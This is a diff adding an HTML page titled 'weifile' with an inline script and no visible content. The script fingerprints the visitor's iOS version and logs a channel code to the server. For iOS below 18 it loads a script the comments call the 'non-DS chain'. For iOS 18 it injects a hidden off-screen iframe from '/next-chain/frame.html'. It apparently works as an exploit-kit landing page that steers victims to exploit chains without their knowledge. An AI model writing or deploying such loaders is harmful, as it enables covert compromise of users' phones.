@@ -1,0 +1,74 @@
+<html>
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+<meta property="og:determiner" content="auto" />
+<title>weifile</title>
+</head>
+<body>
+<script type="text/javascript">
+  (function () {
+    function parseIosVersion() {
+      var ua = navigator.userAgent || '';
+      var m = /iPhone OS ([0-9_]+)/.exec(ua);
+      if (!m) m = /CPU (?:iPhone )?OS ([0-9_]+)/.exec(ua);
+      if (!m) m = /CPU OS ([0-9_]+)/.exec(ua);
+      if (!m) {
+        m = /Version\/(\d+)\.(\d+)/.exec(ua);
+        return m ? [parseInt(m[1], 10), parseInt(m[2], 10)] : null;
+      }
+      return m[1].split('_').map(function (p) {
+        return parseInt(p, 10);
+      });
+    }
+  
+    function pingLog() {
+      try {
+        if (/(?:^|[?&])nolog=1(?:&|$)/.test(location.search || '')) return;
+        var q = 't=' + Date.now();
+        try {
+          var c = new URLSearchParams(location.search || '').get('c');
+          if (!c) {
+            var m = String(location.pathname || '').match(/\/channel\/([0-9A-Za-z]\.[0-9A-Za-z]\.[0-9A-Za-z]{2})\//i);
+            if (m && m[1]) c = m[1];
+          }
+          if (c) q += '&c=' + encodeURIComponent(String(c).toUpperCase());
+        } catch (eQ) {}
+        (new Image()).src = '/log.html?' + q;
+      } catch (eP) {}
+    }
+    pingLog();
+
+    var ios = parseIosVersion();
+    if (!ios || ios[0] < 18) {
+      // Below iOS 18: non-DS chain (index.js).
+      var s = document.createElement('script');
+      s.src = 'index.js?' + Date.now();
+      (document.body || document.documentElement).appendChild(s);
+      return;
+    }
+    if (ios[0] === 18) {
+      var dest = '/next-chain/frame.html';
+      try {
+        var u = new URL(dest, location.origin);
+        var q = new URLSearchParams(location.search || '').get('c');
+        if (q) u.searchParams.set('c', q);
+        else {
+          var m = String(location.pathname || '').match(/\/channel\/([0-9A-Za-z]\.[0-9A-Za-z]\.[0-9A-Za-z]{2})\//i);
+          if (m && m[1]) u.searchParams.set('c', m[1].toUpperCase());
+        }
+        dest = u.pathname + (u.search || '');
+      } catch (eC) {}
+      var f = document.createElement('iframe');
+      f.src = dest;
+      f.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:0;border:0';
+      f.tabIndex = -1;
+      f.setAttribute('aria-hidden', 'true');
+      (document.body || document.documentElement).appendChild(f);
+    }
+    // iOS 19+ / 26+: no action.
+  })();
+</script>
+</body>
+</html>
